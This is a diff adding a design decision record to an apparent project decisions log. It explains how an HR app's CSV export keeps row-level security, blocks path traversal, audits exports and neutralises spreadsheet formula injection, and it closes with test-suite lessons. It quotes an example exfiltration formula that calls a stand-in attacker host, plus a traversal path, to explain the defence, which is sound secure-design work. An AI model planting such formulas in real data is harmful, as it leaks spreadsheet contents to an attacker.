@@ -1643,3 +1643,39 @@ no reason, nothing logged. Replacing it (D108) is what let the next attempt
 surface the real exception. The lesson is not about payroll — it is that an
 error state which discards its cause converts a five-minute bug into three
 rounds of guessing.
+
+## D111 — An export is the same query, not a wider one — **Accepted**
+Every section can now be exported as CSV. The rule that makes it safe is that
+the export runs the caller's own query through the caller's own client: RLS
+decides the rows exactly as it does on screen, so an HOD gets their department
+and someone with no roles gets an empty file. There is no admin client in
+`src/lib/export`, and there must never be one — an export that quietly widened
+access would be the worst bug this product could ship. Asserted, including that
+an HR export of payroll lines contains nothing.
+
+The dataset comes from a fixed registry and is never built from the URL, so
+`/export/../../x` resolves to nothing rather than to a query. Every export is
+audited: a CSV of everyone's pay leaves on a laptop, and "who took a copy" is
+what an audit log is for.
+
+**Formula injection is the part that is easy to miss.** Excel, LibreOffice and
+Sheets all execute a cell beginning `=`, `+`, `-`, `@`, tab or carriage return.
+An applicant types their own name into the public careers form, so
+`=HYPERLINK("http://evil.example?d="&A1,"click")` as a surname becomes a live
+formula in the HR manager's spreadsheet the moment they export. Every cell is
+prefixed with a quote, which those programs read as "text" and do not show.
+Twelve tests cover the escaping and the neutralising.
+
+Two things went wrong while writing this, both worth keeping:
+
+The select gate did not see the new queries — they go through a helper rather
+than `.from().select()` — so eight selects were silently unchecked and the
+count stayed at 65. It now knows both shapes and reports 73. A gate that
+quietly covers less than it did is worse than one that fails.
+
+Three assertions failed before landing, each because they compared counts in
+the last test file, after every earlier file had granted roles to the fixture
+users for its own purposes. Counting is the wrong instrument there. The
+assertions now state properties — no row outside a headed department, no
+payroll line for HR, nothing at all for a user created in the block with no
+roles — which hold whatever the suite leaves behind.
